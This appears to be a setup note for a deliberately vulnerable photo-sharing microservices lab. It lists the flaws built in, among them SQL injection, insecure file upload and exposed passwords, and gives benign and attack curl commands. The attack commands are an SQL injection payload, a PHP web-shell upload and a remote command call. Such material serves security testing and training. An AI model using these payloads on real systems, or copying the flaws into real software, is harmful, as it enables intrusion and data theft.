Frontend: A web interface for users to interact with the application.
API Gateway: Routes requests to appropriate microservices.
User Service: Handles user authentication and management.
Photo Service: Manages photo uploads and retrieval.
User DB and Photo DB: MySQL databases for storing user and photo data.
Recommendation Service:
Analytics Service:

This setup includes the following vulnerabilities:

SQL Injection: In both user_service and photo_service, SQL queries are constructed using string interpolation.
Insecure File Upload: The photo_service doesn't properly validate uploaded files.
Sensitive Data Exposure: The user_service exposes sensitive information like passwords in API responses.
Broken Authentication: The user_service has a weak password policy.
Cross-Site Scripting (XSS): The frontend doesn't properly sanitize user input when displaying photo filenames.

# Scenario:
## Benign
------
### User 
Register User: ```curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"testuser","password":"testpassword"}'```

Login User: ```curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"user99","password":"user99_1234"}'```

### Photos
Upload Photo: ``` curl -X POST "http://10.5.20.45:8000/api/photos/upload"  -H "Content-Type: multipart/form-data" -F "file=@Docker.png" -F "user_id=3"```

View Photo: ```curl -X GET "http://10.5.20.45:8000/photos?user_id=1"```

## Attack
### User
SQL Injection: ```curl -v "http://10.5.20.45:8000/api/users?username=newuser1"```

### Photos
SQL Injection: ```curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"```

PHP Upload: ```curl -X POST "http://10.5.20.45:8000/api/photos/upload" -H "Content-Type: multipart/form-data" -F "file=@malicious.php" -F "user_id=123"```

RCE:   ```curl "http://10.5.20.45:8000/api/photos/ffb2d665-3916-47a9-99fd-3c170462a0aa.php?user_id=1&cmd=ls"```